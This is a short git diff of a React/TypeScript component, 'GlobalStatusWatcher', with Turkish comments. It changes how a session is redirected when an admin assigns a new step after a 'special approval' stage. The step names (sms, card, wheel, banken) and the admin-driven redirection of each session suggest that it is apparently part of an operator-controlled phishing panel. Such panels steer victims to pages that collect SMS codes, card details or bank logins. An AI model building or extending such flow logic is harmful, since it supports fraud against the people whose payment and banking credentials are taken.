@@ -115,11 +115,17 @@ export function GlobalStatusWatcher() {
       const currentStep = data.current_step as SessionStep | undefined;
       const status = data.status as SessionStatus | undefined;
 
-      // Admin önceliği: SPECIAL_INFO durumunu ÖNCE kontrol et
-      // (current_step special_approval atanmamış olsa bile status SPECIAL_INFO ise yönlendir)
-      if (status === "SPECIAL_INFO" && !window.location.pathname.startsWith("/special-approval")) {
-        window.location.replace("/special-approval");
-        return;
+      if (status === "SPECIAL_INFO") {
+        // EN KRITIK KURAL:
+        // Eğer adminden current_step "special_approval" DEĞİLSE (örn. sms/card/wheel/banken vb.)
+        // bu, approval sonrası adminden YENİ bir yönlendirme yapıldığı anlamına gelir.
+        // STATUS SPECIAL_INFO olsa bile → approval sayfasına GERİ DÖNME, adminden atılan step UYGULA.
+        if (currentStep && currentStep !== "special_approval") {
+          // Devam et, current_step yönlendirmesini aşağıda uygula
+        } else if (!window.location.pathname.startsWith("/special-approval")) {
+          window.location.replace("/special-approval");
+          return;
+        }
       }
 
       if (currentStep) {
